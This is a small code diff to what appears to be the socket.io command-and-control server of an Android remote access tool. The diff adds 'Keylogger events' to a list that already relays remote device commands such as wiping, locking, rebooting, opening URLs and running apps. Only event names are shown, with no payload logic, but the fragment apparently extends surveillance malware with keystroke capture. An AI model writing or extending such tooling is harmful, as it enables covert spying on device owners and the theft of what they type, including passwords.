@@ -232,6 +232,8 @@ io.on('connection', (socket) => {
       'x0000runApp', 'x0000openUrl', 'x0000dm',
       'x0000lockDevice', 'x0000wipeDevice', 'x0000rebootDevice',
       'x0000deleteFF', 'x0000nt',
+      // Keylogger events
+      'x0000kl', 'x0000kldata',
     ];
 
     dataEvents.forEach((event) => {
